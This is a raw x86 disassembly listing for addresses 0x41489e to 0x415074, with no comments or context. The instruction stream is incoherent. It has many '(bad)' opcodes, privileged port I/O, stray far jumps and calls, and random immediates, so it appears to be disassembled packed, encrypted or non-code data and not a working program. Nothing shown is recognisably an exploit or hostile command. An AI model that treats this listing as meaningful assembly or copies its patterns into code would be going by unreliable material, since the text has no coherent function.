  41489e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41489f:	aaa    
  4148a0:	ror    BYTE PTR [ebx+ebp*1+0x65339811],cl
  4148a7:	sub    esp,DWORD PTR [ebx]
  4148a9:	inc    esp
  4148aa:	pop    esi
  4148ab:	cmc    
  4148ac:	cmp    DWORD PTR [edx],esi
  4148ae:	into   
  4148af:	lock shl DWORD PTR [ecx+0x4c],1
  4148b3:	imul   ecx,DWORD PTR fs:[eax-0x45],0x2f
  4148b8:	repnz or ah,BYTE PTR [ecx+0x22c4523d]
  4148bf:	push   ss
  4148c0:	ja     0x41490b
  4148c2:	cmp    dh,BYTE PTR [ecx+0x4]
  4148c5:	lds    ebx,FWORD PTR [ecx+eiz*1]
  4148c8:	pushf  
  4148c9:	push   ds
  4148ca:	pushf  
  4148cb:	or     DWORD PTR [ecx-0x60],edx
  4148ce:	jge    0x414902
  4148d0:	xchg   DWORD PTR [eax],esi
  4148d2:	faddp  st(6),st
  4148d4:	cmp    DWORD PTR [edi+edx*1],edi
  4148d7:	inc    edx
  4148d8:	popf   
  4148d9:	sbb    eax,0x6a12081
  4148de:	jecxz  0x41488d
  4148e0:	out    0xfd,al
  4148e2:	add    BYTE PTR [ebp-0x49],0x67
  4148e6:	aam    0xaa
  4148e8:	loop   0x41490c
  4148ea:	mov    ds:0x80381251,al
  4148ef:	int3   
  4148f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148f1:	pop    es
  4148f2:	lahf   
  4148f3:	and    ebx,eax
  4148f5:	dec    ecx
  4148f6:	inc    ebp
  4148f7:	leave  
  4148f8:	xor    ecx,edi
  4148fa:	or     ch,BYTE PTR [ebx+0x6da59787]
  414900:	xchg   ebp,eax
  414901:	sub    edi,DWORD PTR [edi+0x7a]
  414904:	cli    
  414905:	dec    esi
  414906:	lock sbb dl,BYTE PTR [edi+0xd091362]
  41490d:	test   eax,0xee095be9
  414912:	retf   0x5aeb
  414915:	add    dl,al
  414917:	cld    
  414918:	push   esi
  414919:	dec    ecx
  41491a:	inc    edx
  41491b:	fwait
  41491c:	shr    dh,1
  41491e:	scas   eax,DWORD PTR es:[edi]
  41491f:	lods   eax,DWORD PTR ds:[esi]
  414920:	or     al,0xb1
  414922:	mov    al,ds:0x83484fa6
  414927:	ret    0x9c1d
  41492a:	int3   
  41492b:	add    ebx,ecx
  41492d:	xor    ecx,ebx
  41492f:	lds    edx,FWORD PTR [edi+ebx*1-0x681ac52c]
  414936:	mov    ss:0x3e5b8e27,al
  41493c:	jmp    0xa4ed:0x27b3540c
  414943:	adc    al,0x34
  414945:	and    esp,ebp
  414947:	pop    ecx
  414948:	sbb    esp,DWORD PTR [ebx+0x3d]
  41494b:	push   ss
  41494c:	nop
  41494d:	out    dx,eax
  41494e:	xacquire xchg DWORD PTR [esi+edi*2-0x6373c500],eax
  414956:	cmp    ch,BYTE PTR [eax+0x3e46ff00]
  41495c:	test   eax,0x6798fc0e
  414961:	(bad)  
  414962:	jno    0x41496a
  414964:	into   
  414965:	add    DWORD PTR [edx-0x7776523a],esi
  41496b:	pop    ss
  41496c:	pop    ebp
  41496d:	xchg   esp,eax
  41496e:	mov    edi,DWORD PTR [edi-0x79]
  414971:	inc    edx
  414972:	pusha  
  414973:	inc    esp
  414974:	mov    bh,0x5b
  414976:	and    bh,BYTE PTR [edx-0x14]
  414979:	mov    eax,0x49ac52c9
  41497e:	stos   DWORD PTR es:[edi],eax
  41497f:	or     ah,bh
  414981:	mov    bl,BYTE PTR [edx+0x17]
  414984:	and    eax,0x8a1894f0
  414989:	mov    ch,0xd1
  41498b:	pop    ecx
  41498c:	cld    
  41498d:	out    0x70,eax
  41498f:	sbb    al,0xaa
  414991:	push   ebx
  414992:	jmp    0x414a0e
  414994:	(bad)  
  414995:	mov    esp,0xce7e9f6f
  41499a:	in     eax,dx
  41499b:	in     eax,dx
  41499c:	ror    BYTE PTR [esi-0x33],1
  41499f:	jle    0x414975
  4149a1:	aad    0x34
  4149a3:	or     BYTE PTR [ecx+0x1b86f4c7],al
  4149a9:	push   ebp
  4149aa:	out    0x4e,al
  4149ac:	jae    0x414a1e
  4149ae:	iret   
  4149af:	push   eax
  4149b0:	(bad)  
  4149b1:	cmc    
  4149b2:	inc    eax
  4149b3:	mov    ch,0x71
  4149b5:	xor    esp,DWORD PTR [ebx]
  4149b7:	jle    0x414981
  4149b9:	jl     0x414966
  4149bb:	adc    al,0x36
  4149bd:	nop
  4149be:	or     eax,0x70e16bc
  4149c3:	out    0x93,eax
  4149c5:	mov    edi,cs
  4149c7:	push   ds
  4149c8:	adc    al,0x20
  4149ca:	test   BYTE PTR [edx+0x213f762b],bl
  4149d0:	jmp    0x414a1e
  4149d2:	into   
  4149d3:	inc    edx
  4149d4:	mov    dh,0xe6
  4149d6:	call   0xc9974fae
  4149db:	ficomp DWORD PTR [esi]
  4149dd:	pusha  
  4149de:	xchg   DWORD PTR [ebp-0x55293ea],eax
  4149e4:	pushf  
  4149e5:	adc    ebp,DWORD PTR [esi+0x52]
  4149e8:	stos   BYTE PTR es:[edi],al
  4149e9:	mov    al,ds:0x59e1f897
  4149ee:	loope  0x414a6e
  4149f0:	sbb    DWORD PTR [eax+0xd86e187],edi
  4149f6:	pop    edi
  4149f7:	dec    ebx
  4149f8:	or     eax,0x80d30cdd
  4149fd:	sbb    eax,0xb9a87176
  414a02:	sub    cl,BYTE PTR [edx-0x30637c85]
  414a08:	std    
  414a09:	popa   
  414a0a:	ret    0x959f
  414a0d:	or     DWORD PTR [ecx],edi
  414a0f:	aam    0x7e
  414a11:	xor    eax,0x90fdd44f
  414a16:	cdq    
  414a17:	js     0x414a38
  414a19:	scas   al,BYTE PTR es:[edi]
  414a1a:	ins    DWORD PTR es:[edi],dx
  414a1b:	sub    eax,0x75c413f1
  414a20:	cmp    ah,BYTE PTR [edx]
  414a22:	jmp    0x43ab14e
  414a27:	dec    ecx
  414a28:	and    DWORD PTR [ebx+0x104360ac],ecx
  414a2e:	inc    esi
  414a2f:	xchg   ebx,eax
  414a30:	ins    BYTE PTR es:[edi],dx
  414a31:	inc    edx
  414a32:	and    esp,edi
  414a34:	sbb    BYTE PTR [esi-0x6eb9d7f7],dl
  414a3a:	pop    eax
  414a3b:	shl    DWORD PTR [ecx+0x6b],cl
  414a3e:	(bad)  
  414a3f:	sti    
  414a40:	in     eax,dx
  414a41:	adc    eax,0x89ec736c
  414a46:	xchg   ecx,eax
  414a47:	mov    esp,0xab5cab51
  414a4c:	mov    dl,0x10
  414a4e:	or     al,cl
  414a50:	pop    ds
  414a51:	shl    BYTE PTR [eax+0x3a],cl
  414a54:	add    al,0xb6
  414a56:	test   DWORD PTR [ebx-0x6a],0x878797ae
  414a5d:	(bad)  
  414a5f:	sbb    BYTE PTR [edx+0x50],dh
  414a62:	adc    ah,ch
  414a64:	mov    dl,0xed
  414a66:	push   esp
  414a67:	or     DWORD PTR [edx+0x1689ece1],esi
  414a6d:	xchg   esi,eax
  414a6e:	or     ch,BYTE PTR ds:0xb8be1be0
  414a74:	mov    edx,0xa5a0c0c7
  414a79:	mov    ds:0xafca11a2,al
  414a7e:	mov    es,ecx
  414a80:	std    
  414a81:	(bad)  
  414a82:	mov    ah,0x5e
  414a84:	(bad)  
  414a85:	mov    edx,0x3d7891a
  414a8a:	inc    esi
  414a8b:	ror    DWORD PTR [ebp-0xe],0x9c
  414a8f:	inc    ecx
  414a90:	(bad)  
  414a91:	cmp    DWORD PTR [ecx-0x4c],esi
  414a94:	call   FWORD PTR [ebx]
  414a96:	add    bh,BYTE PTR [ecx+0x67a7f7b7]
  414a9c:	pop    es
  414a9d:	or     BYTE PTR [ebx],dh
  414a9f:	jg     0x414ad6
  414aa1:	push   eax
  414aa2:	(bad)  
  414aa4:	sahf   
  414aa5:	jae    0x414af1
  414aa7:	mov    cl,0xe
  414aa9:	ret    
  414aaa:	add    BYTE PTR [esi+0x3463acae],ch
  414ab0:	cdq    
  414ab1:	addr16 inc esp
  414ab3:	in     al,dx
  414ab4:	mov    esp,0xd1c7a49e
  414ab9:	stos   DWORD PTR es:[edi],eax
  414aba:	jl     0x414afb
  414abc:	mov    eax,ds:0x2f84c35f
  414ac1:	das    
  414ac2:	rep stos BYTE PTR es:[edi],al
  414ac4:	fisubr DWORD PTR [ecx+0x29]
  414ac7:	shr    DWORD PTR [eax],1
  414ac9:	dec    edi
  414aca:	push   0x380ecc7b
  414acf:	inc    esp
  414ad0:	and    dl,dl
  414ad2:	inc    eax
  414ad3:	push   edi
  414ad4:	addr16 jl 0x414b06
  414ad7:	ds push edi
  414ad9:	enter  0xc5ff,0x96
  414add:	jns    0x414aaa
  414adf:	dec    eax
  414ae0:	mov    cl,0x8f
  414ae2:	pop    esp
  414ae3:	(bad)  
  414ae4:	mov    eax,0x150f21fb
  414ae9:	inc    esi
  414aea:	or     edx,DWORD PTR [ebx-0x4d]
  414aed:	mov    ecx,0xa8d1f7a1
  414af2:	mov    ds:0x7a1016c9,eax
  414af7:	or     edx,DWORD PTR [esp+eiz*4+0x9]
  414afb:	icebp  
  414afc:	jne    0x414b1d
  414afe:	fs (bad) 
  414b00:	retf   
  414b01:	or     cl,BYTE PTR [edx]
  414b03:	jl     0x414b42
  414b05:	inc    esi
  414b06:	icebp  
  414b07:	jnp    0x414ada
  414b09:	mov    al,ds:0xd9d86ee1
  414b0e:	sub    bl,dl
  414b10:	adc    al,0xda
  414b12:	in     al,dx
  414b13:	xchg   BYTE PTR [esi-0x21],cl
  414b16:	leave  
  414b17:	push   ebx
  414b18:	data16 stc 
  414b1a:	mov    bh,bh
  414b1c:	popf   
  414b1d:	or     esi,edx
  414b1f:	dec    eax
  414b20:	enter  0xc700,0x72
  414b24:	jge    0x414aad
  414b26:	bound  ebx,QWORD PTR [ebp+0x2f73c1e]
  414b2c:	fist   WORD PTR [edi+ebx*1]
  414b2f:	iret   
  414b30:	jnp    0x414b16
  414b32:	(bad)
  414b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b38:	pushf  
  414b39:	or     al,0xcf
  414b3b:	or     cl,BYTE PTR fs:[ebx-0x74e9942b]
  414b42:	sub    al,0x76
  414b44:	jno    0x414af0
  414b46:	jmp    0x414b58
  414b48:	out    dx,al
  414b49:	mov    ecx,0x73626b4b
  414b4e:	out    0x7e,al
  414b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b51:	aad    0x58
  414b53:	popf   
  414b54:	repz inc esp
  414b56:	sbb    dh,BYTE PTR [eax-0x55]
  414b59:	pusha  
  414b5a:	sub    al,0x54
  414b5c:	fwait
  414b5d:	mov    fs,WORD PTR [ecx]
  414b5f:	xchg   edi,eax
  414b60:	push   ebx
  414b61:	sub    ebp,ecx
  414b63:	sub    ecx,edx
  414b65:	jge    0x414be4
  414b67:	and    DWORD PTR [ebx-0x3c3246cb],esi
  414b6d:	mov    bh,0xa1
  414b6f:	mov    eax,0xf6914783
  414b74:	inc    esp
  414b75:	iret   
  414b76:	push   edx
  414b77:	push   ebx
  414b78:	pop    ss
  414b79:	jnp    0x414bc5
  414b7b:	neg    esp
  414b7d:	fnstenv [edi-0x61]
  414b80:	dec    edi
  414b81:	mov    esi,0x9933e7c8
  414b86:	(bad)  
  414b87:	xchg   esp,eax
  414b88:	push   edx
  414b89:	into   
  414b8a:	cmp    eax,0x4ad2a5c4
  414b8f:	test   DWORD PTR [esi*1-0x503e80a7],edx
  414b96:	in     eax,dx
  414b97:	and    cl,BYTE PTR [ebx-0x56]
  414b9a:	fistp  DWORD PTR [edx-0x14]
  414b9d:	in     eax,0x3a
  414b9f:	jp     0x414b5d
  414ba1:	push   esi
  414ba2:	out    0x27,al
  414ba4:	test   BYTE PTR [ecx+0x1306603],0xa5
  414bab:	add    al,0xd0
  414bad:	cs aaa 
  414baf:	mov    esp,0x62c30585
  414bb4:	xchg   ebp,eax
  414bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb6:	hlt    
  414bb7:	cmp    eax,DWORD PTR [eax+0x45]
  414bba:	mov    ebx,0x5111ee0d
  414bbf:	jne    0x414b85
  414bc1:	repnz xchg bl,dl
  414bc4:	or     BYTE PTR [edx],0x50
  414bc7:	dec    edx
  414bc8:	dec    ebp
  414bc9:	or     DWORD PTR [edi+ecx*4],esp
  414bcc:	les    ebx,FWORD PTR [esi+0x2d]
  414bcf:	fnstsw WORD PTR [ecx-0x7c]
  414bd2:	mov    edi,DWORD PTR [edi-0x34]
  414bd5:	cmp    eax,0xf68226a5
  414bda:	stos   BYTE PTR es:[edi],al
  414bdb:	pop    ecx
  414bdc:	and    eax,0x685172e1
  414be1:	int    0xd2
  414be3:	mov    edi,0xfd7c4ff2
  414be8:	fwait
  414be9:	mov    ds:0x7ee12035,eax
  414bee:	push   esi
  414bef:	cli    
  414bf0:	xlat   BYTE PTR ds:[ebx]
  414bf1:	iret   
  414bf2:	push   ebp
  414bf3:	repnz out 0x4d,al
  414bf6:	ret    
  414bf7:	jle    0x414bfc
  414bf9:	or     BYTE PTR [ecx+0x1d4ca6e9],0x93
  414c00:	mov    al,0x5b
  414c02:	mov    cl,0xa2
  414c04:	(bad)  
  414c06:	jge    0x414c0f
  414c08:	sub    al,0x3b
  414c0a:	ss addr16 xor eax,0xc6f01ed1
  414c11:	jbe    0x414c7e
  414c13:	add    DWORD PTR [ecx+0x15],ebp
  414c16:	add    BYTE PTR [edi+0x3],0xb2
  414c1a:	xor    eax,0x7e14f2ac
  414c1f:	jb     0x414bee
  414c21:	push   cs
  414c22:	std    
  414c23:	imul   esi,ecx,0x991a20ef
  414c29:	mov    ebp,0x210adf9b
  414c2e:	jge    0x414c3a
  414c30:	mov    esp,0x14b030d0
  414c35:	ins    DWORD PTR es:[edi],dx
  414c36:	jl     0x414c18
  414c38:	lods   eax,DWORD PTR ds:[esi]
  414c39:	or     al,0x34
  414c3b:	in     eax,dx
  414c3c:	push   ebx
  414c3d:	pop    ecx
  414c3e:	pop    esp
  414c3f:	mov    eax,0x8a2e9e3f
  414c44:	inc    edx
  414c45:	je     0x414c4c
  414c47:	(bad)  
  414c48:	sub    DWORD PTR ds:0x5a8a3cea,esi
  414c4f:	adc    BYTE PTR [ebp-0x2b229c56],bl
  414c55:	jns    0x414c99
  414c57:	sbb    ebx,DWORD PTR fs:[ebx+0x3833bfc]
  414c5e:	push   edx
  414c5f:	in     al,0x7a
  414c61:	cmp    BYTE PTR [ecx-0x1f9344cc],dl
  414c67:	inc    ebp
  414c68:	jecxz  0x414cdf
  414c6a:	fcmovne st,st(5)
  414c6c:	xor    eax,0x6c6c4de9
  414c71:	(bad)  
  414c72:	in     al,dx
  414c73:	adc    edx,DWORD PTR [eax]
  414c75:	inc    edx
  414c76:	add    eax,0x1816349a
  414c7b:	es sbb al,0xd9
  414c7e:	push   ss
  414c7f:	int    0xb0
  414c81:	pop    esp
  414c82:	dec    esp
  414c83:	popf   
  414c84:	sub    DWORD PTR [eax+ecx*2-0x79],0x45
  414c89:	test   BYTE PTR [ecx],dl
  414c8b:	mov    esi,ss
  414c8d:	out    0xc0,al
  414c8f:	mov    ah,0xca
  414c91:	cli    
  414c92:	sub    ch,bl
  414c94:	test   DWORD PTR [eax+0x42],esi
  414c97:	jg     0x414cb6
  414c99:	cmp    al,0x27
  414c9b:	das    
  414c9c:	(bad)  
  414c9d:	call   DWORD PTR [ecx]
  414c9f:	push   0x5962c785
  414ca4:	jecxz  0x414c4b
  414ca6:	sbb    eax,0x9e69e637
  414cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cac:	sbb    dh,cl
  414cae:	loop   0x414cea
  414cb0:	sub    eax,0x60464d32
  414cb5:	sbb    ch,BYTE PTR [eax+0x39057b52]
  414cbb:	inc    ecx
  414cbc:	fistp  QWORD PTR [esi+0x3ef4496d]
  414cc2:	and    BYTE PTR [ebp+0x59],bl
  414cc5:	add    al,0x64
  414cc7:	(bad)  
  414cc8:	icebp  
  414cc9:	and    al,0x9c
  414ccb:	imul   esi,DWORD PTR [ebp-0x43],0xf8031772
  414cd2:	adc    bl,BYTE PTR [edi+0x72]
  414cd5:	imul   esi,DWORD PTR [eax-0x7b],0xa6e5ccda
  414cdc:	call   0x2c39a031
  414ce1:	aam    0x70
  414ce3:	xor    esp,ebp
  414ce5:	fucomip st,st(5)
  414ce7:	and    al,0x36
  414ce9:	dec    edx
  414cea:	aas    
  414ceb:	pop    esi
  414cec:	add    edx,ebp
  414cee:	cwde   
  414cef:	rsqrtps xmm3,XMMWORD PTR [ecx+eax*8-0x1fa97540]
  414cf7:	cmc    
  414cf8:	fisttp WORD PTR [esi]
  414cfa:	jmp    0x414d0c
  414cfc:	push   cs
  414cfd:	jnp    0x414cd3
  414cff:	frstor [esi]
  414d01:	sbb    al,0x21
  414d03:	pop    ds
  414d04:	call   0xa5e4:0x895a48c2
  414d0b:	sbb    BYTE PTR [edi+0x1e],0xea
  414d0f:	icebp  
  414d10:	mov    ds:0x1de2304,al
  414d15:	bound  esi,QWORD PTR [ebp-0x5a]
  414d18:	jecxz  0x414d5b
  414d1a:	push   ss
  414d1b:	loope  0x414d6f
  414d1d:	push   edi
  414d1e:	mov    ds:0xcb81fa28,al
  414d23:	add    DWORD PTR [eax],ebp
  414d25:	xchg   DWORD PTR [eax-0x5],esi
  414d28:	enter  0x7353,0x7b
  414d2c:	xor    ch,ch
  414d2e:	mov    eax,ds:0x23796ea2
  414d33:	cmp    DWORD PTR [ebp-0x1666ef23],esp
  414d39:	(bad)  
  414d3a:	cmp    al,0x70
  414d3c:	push   es
  414d3d:	lock fild DWORD PTR [ecx]
  414d40:	enter  0xc4f0,0x3
  414d44:	aaa    
  414d45:	adc    eax,esi
  414d47:	pop    edx
  414d48:	aad    0x14
  414d4a:	repz sub esi,esi
  414d4d:	(bad)
  414d50:	fimul  DWORD PTR [ebp-0x169d1e8e]
  414d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d57:	and    BYTE PTR [edx-0x69],ah
  414d5a:	stc    
  414d5b:	pop    es
  414d5c:	call   FWORD PTR [edx]
  414d5e:	outs   dx,BYTE PTR cs:[esi]
  414d60:	sub    dh,BYTE PTR [ecx+0x39e3cae0]
  414d66:	inc    esp
  414d67:	adc    al,0x29
  414d69:	scas   al,BYTE PTR es:[edi]
  414d6a:	sub    ebp,DWORD PTR [esi+eiz*2+0x2e]
  414d6e:	add    DWORD PTR [esi+0x11],ecx
  414d71:	int    0x13
  414d73:	push   ds
  414d74:	cli    
  414d75:	sahf   
  414d76:	enter  0x6bcd,0x9f
  414d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d7b:	pusha  
  414d7c:	pop    eax
  414d7d:	mov    es,WORD PTR [ebx]
  414d7f:	lahf   
  414d80:	int3   
  414d81:	jnp    0x414d0d
  414d83:	fsub   DWORD PTR [ebx-0x77]
  414d86:	mov    ebx,0xd4688cc4
  414d8b:	stc    
  414d8c:	sub    eax,0xf4dc1ba4
  414d91:	push   ebx
  414d92:	mov    esp,0x2da5c864
  414d97:	mov    al,ds:0xce187544
  414d9c:	or     al,0x21
  414d9e:	or     DWORD PTR [edi+0x6fb46e8e],0xfffffff5
  414da5:	rcr    DWORD PTR [eax],1
  414da7:	add    al,0x14
  414da9:	push   esi
  414daa:	jmp    0x414d83
  414dac:	mov    eax,ds:0x23d24c8f
  414db1:	in     eax,0xde
  414db3:	dec    esi
  414db4:	ins    BYTE PTR es:[edi],dx
  414db5:	inc    eax
  414db6:	leave  
  414db7:	jnp    0x414dd1
  414db9:	pusha  
  414dba:	xchg   esi,eax
  414dbb:	test   eax,0x7c2c804f
  414dc0:	scas   al,BYTE PTR es:[edi]
  414dc1:	out    0xdf,eax
  414dc3:	sbb    DWORD PTR [ebp+0x7696ead6],edi
  414dc9:	and    ah,BYTE PTR [ebp+0x5f]
  414dcc:	bound  edx,QWORD PTR [esi-0x3e]
  414dcf:	xchg   edx,eax
  414dd0:	or     BYTE PTR [esi-0x17],bl
  414dd3:	fisubr WORD PTR [edx]
  414dd5:	int3   
  414dd6:	cmc    
  414dd7:	rol    BYTE PTR [ecx+0x637af524],1
  414ddd:	mov    es,WORD PTR [ebx]
  414ddf:	mov    BYTE PTR [edx],al
  414de1:	adc    dl,BYTE PTR [eax]
  414de3:	retf   0x22e6
  414de6:	pushf  
  414de7:	adc    ecx,DWORD PTR [ecx+0x20]
  414dea:	sti    
  414deb:	pushf  
  414dec:	mov    eax,ds:0x95bd2b3
  414df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df2:	pop    eax
  414df3:	cmp    BYTE PTR [edx],0xae
  414df6:	mov    BYTE PTR [edi],0x0
  414df9:	enter  0xc804,0x59
  414dfd:	mov    cl,0x6c
  414dff:	jp     0x414dd6
  414e01:	xor    esi,ebx
  414e03:	fwait
  414e04:	mov    edx,0x47e42e6f
  414e09:	inc    edi
  414e0a:	jbe    0x414e5d
  414e0c:	dec    edi
  414e0d:	pop    edi
  414e0e:	imul   ecx,DWORD PTR [eax-0x4a],0x8781eeba
  414e15:	std    
  414e16:	sub    DWORD PTR [edi-0x2d04a9f5],edi
  414e1c:	dec    esi
  414e1d:	jmp    DWORD PTR [ebx-0x16f732e7]
  414e23:	mov    esp,0x25170af
  414e28:	(bad)  
  414e2a:	cmp    eax,esp
  414e2c:	sub    BYTE PTR [eax],0x93
  414e2f:	cmp    DWORD PTR [edx+0x116ab428],0xffffff90
  414e36:	jb     0x414e74
  414e38:	or     DWORD PTR [ecx-0x78dfaf30],esi
  414e3e:	fst    QWORD PTR [eax-0x5b8a7947]
  414e44:	cld    
  414e45:	sbb    DWORD PTR [ebp-0x14],0xffffffa3
  414e49:	xor    bl,BYTE PTR [edx]
  414e4b:	fdivr  st(5),st
  414e4d:	xchg   esi,eax
  414e4e:	aad    0x8c
  414e50:	test   BYTE PTR [esi],cl
  414e52:	es and ch,cl
  414e55:	sub    ah,bh
  414e57:	sub    al,0xa6
  414e59:	xchg   ecx,eax
  414e5a:	enter  0x93b9,0x37
  414e5e:	mov    dl,BYTE PTR [esi-0x14272b5e]
  414e64:	pop    eax
  414e65:	rcl    WORD PTR [edi+edx*2+0x5b127593],0x4f
  414e6e:	cmp    DWORD PTR [ebp+eiz*1-0x10],esi
  414e72:	pop    esp
  414e73:	lds    ebp,FWORD PTR [esi]
  414e75:	cmc    
  414e76:	xor    al,0x7a
  414e78:	sub    eax,0x112f73cd
  414e7d:	out    dx,al
  414e7e:	ja     0x414ea7
  414e80:	scas   al,BYTE PTR es:[edi]
  414e81:	icebp  
  414e82:	xchg   edi,eax
  414e83:	icebp  
  414e84:	int3   
  414e85:	mov    ch,0x3c
  414e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e88:	cmp    bh,BYTE PTR [esi+0x61]
  414e8b:	mov    bh,BYTE PTR [ebp-0x5dfafb12]
  414e91:	add    DWORD PTR [ebx-0x19c7c631],esp
  414e97:	inc    esi
  414e98:	jno    0x414ef6
  414e9a:	xlat   BYTE PTR ds:[ebx]
  414e9b:	(bad)  
  414e9c:	cmp    esi,DWORD PTR [eax-0x42396e36]
  414ea2:	sub    DWORD PTR [edx+0x68],ecx
  414ea5:	pop    esi
  414ea6:	nop
  414ea7:	or     eax,0x71481e66
  414eac:	leave  
  414ead:	or     eax,0x311d8e66
  414eb2:	inc    esi
  414eb3:	sbb    eax,0x6b6d595b
  414eb8:	dec    esp
  414eb9:	dec    ebp
  414eba:	push   ss
  414ebb:	xor    esp,DWORD PTR [ecx]
  414ebd:	adc    ch,BYTE PTR [esi-0x621e0ef6]
  414ec3:	bound  esi,QWORD PTR [edx-0x3a4dbaa5]
  414ec9:	inc    esp
  414eca:	enter  0x7697,0xf4
  414ece:	xor    esp,edi
  414ed0:	jl     0x414ed0
  414ed2:	test   eax,0x146980cf
  414ed7:	or     ecx,DWORD PTR [ecx-0x17]
  414eda:	add    DWORD PTR [edi-0x35c66468],edi
  414ee0:	rcl    DWORD PTR [ebx+eax*2+0x2a],0xac
  414ee5:	xchg   esp,eax
  414ee6:	sub    eax,0xb14e994
  414eeb:	fsubr  QWORD PTR [ecx+0x5507d31]
  414ef1:	(bad)  
  414ef3:	sub    eax,0xe7fc7f06
  414ef8:	sti    
  414ef9:	push   ebp
  414efa:	fsub   QWORD PTR [ecx+0x7f520ad9]
  414f00:	fcomp  DWORD PTR [ecx+eiz*2-0x69]
  414f04:	mov    esi,0x4c95cd75
  414f09:	sub    ebx,DWORD PTR [edi-0x14782fe3]
  414f0f:	pop    edx
  414f10:	stos   BYTE PTR es:[edi],al
  414f11:	push   ecx
  414f12:	scas   al,BYTE PTR es:[edi]
  414f13:	and    eax,0xc465fe91
  414f18:	inc    esp
  414f19:	xor    eax,edi
  414f1b:	push   eax
  414f1c:	gs into 
  414f1e:	fcom   st(0)
  414f20:	adc    DWORD PTR [ebx+0x767fbe8],esi
  414f26:	or     DWORD PTR [esi+0x53],esi
  414f29:	mov    edi,0x3ce0c852
  414f2e:	fwait
  414f2f:	sbb    DWORD PTR ds:0x67b452d,ebx
  414f35:	xchg   DWORD PTR [esi+0x46e7e36b],ebp
  414f3b:	iret   
  414f3c:	xchg   ebx,eax
  414f3d:	aas    
  414f3e:	je     0x414ec4
  414f40:	or     al,0x7d
  414f42:	add    al,0x80
  414f44:	dec    ebp
  414f45:	xchg   ebp,eax
  414f46:	fsubp  st(6),st
  414f48:	inc    edx
  414f49:	push   0xb3ef5baf
  414f4e:	pop    esi
  414f4f:	jge    0x414fca
  414f51:	aaa    
  414f52:	mov    esp,0xfd75c6a
  414f57:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  414f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f5a:	push   ds
  414f5b:	pop    ss
  414f5c:	mov    DWORD PTR [ebx+0x54],esi
  414f5f:	fld    DWORD PTR [esi]
  414f61:	dec    edx
  414f62:	lock addr16 push ds
  414f65:	mov    edi,0x9a141f58
  414f6a:	leave  
  414f6b:	sub    ch,BYTE PTR [edi]
  414f6d:	outs   dx,DWORD PTR ds:[esi]
  414f6e:	(bad)  
  414f6f:	jns    0x414ef5
  414f71:	ds push esi
  414f73:	xchg   ebx,eax
  414f74:	in     al,0xc
  414f76:	ds (bad) 
  414f78:	sub    DWORD PTR [ebx-0x6d],ebx
  414f7b:	in     eax,dx
  414f7c:	bound  esi,QWORD PTR [ebp-0x50]
  414f7f:	mov    DWORD PTR ds:0x16e09f3f,ecx
  414f85:	ds mov dh,0xec
  414f88:	jb     0x414ff2
  414f8a:	push   ecx
  414f8b:	adc    eax,esp
  414f8d:	mov    dl,0x19
  414f8f:	outs   dx,BYTE PTR ds:[esi]
  414f90:	rcl    DWORD PTR [edi+0xd],0xd3
  414f94:	addr16 jns 0x414f43
  414f97:	ja     0x414f80
  414f99:	cmp    BYTE PTR [edi+0x6a],bh
  414f9c:	in     al,dx
  414f9d:	fstp   QWORD PTR [esi]
  414f9f:	(bad)  
  414fa0:	not    DWORD PTR [ecx+0x17]
  414fa3:	jg     0x414f7d
  414fa5:	xchg   BYTE PTR [edi+0x7d],cl
  414fa8:	fist   DWORD PTR [ebp+0x701f1ff4]
  414fae:	adc    eax,0x7e58f04c
  414fb3:	dec    ecx
  414fb4:	(bad)  
  414fb5:	dec    esp
  414fb6:	inc    ebp
  414fb7:	test   al,0xaa
  414fb9:	imul   ecx,DWORD PTR [ecx],0x64177079
  414fbf:	outs   dx,DWORD PTR ds:[esi]
  414fc0:	test   eax,0x4c12ceff
  414fc5:	push   esi
  414fc6:	int3   
  414fc7:	mov    ds:0xf2380021,al
  414fcc:	jbe    0x41500a
  414fce:	shl    DWORD PTR [eax],0x5a
  414fd1:	sbb    ch,BYTE PTR [ebp-0x4f11efc]
  414fd7:	mov    BYTE PTR [ebx-0x27c5823a],ch
  414fdd:	mov    esi,0x33ac974c
  414fe2:	mov    WORD PTR [ecx+ecx*1+0x18550748],fs
  414fe9:	mov    ah,0xbc
  414feb:	dec    edi
  414fec:	jp     0x414f8b
  414fee:	nop
  414fef:	sub    DWORD PTR [edi-0x5b],esp
  414ff2:	add    BYTE PTR [edx+0x49fb2225],bl
  414ff8:	ins    BYTE PTR es:[edi],dx
  414ff9:	(bad)  
  414ffa:	stos   BYTE PTR es:[edi],al
  414ffb:	or     DWORD PTR [esi-0x16],0xe562175d
  415002:	push   ds
  415003:	je     0x41500d
  415005:	cmp    BYTE PTR ds:0x91af0f8f,0xe6
  41500c:	rcr    DWORD PTR [ebx-0x7c02972c],0x8e
  415013:	rcl    BYTE PTR es:[edi-0x135bee9e],1
  41501a:	and    al,bh
  41501c:	xor    eax,0xbf7f83f
  415021:	add    eax,0x39b293e2
  415026:	repnz mov eax,ds:0x1f7e039b
  41502c:	mov    eax,0xe9b217bd
  415031:	aaa    
  415032:	popa   
  415033:	cld    
  415034:	pop    edx
  415035:	(bad)  
  415036:	xor    al,0xc3
  415038:	bound  edx,QWORD PTR [ecx+0x4e395a1c]
  41503e:	cmp    dl,bl
  415040:	(bad)  
  415041:	test   eax,0x16921316
  415046:	and    dh,cl
  415048:	push   ss
  415049:	pop    eax
  41504a:	out    0xe9,al
  41504c:	jg     0x415081
  41504e:	ss inc esp
  415050:	mov    BYTE PTR [ebp+0x5664a211],dl
  415056:	pop    ds
  415057:	sub    al,0xf8
  415059:	xor    ch,ah
  41505b:	aaa    
  41505c:	sbb    esp,esi
  41505e:	je     0x4150aa
  415060:	mov    ebx,0xad0acd04
  415065:	jg     0x41502b
  415067:	repnz mov ds:0x56e44428,eax
  41506d:	call   0x89fe:0x7deeae05
  415074:	rcr    esi,1
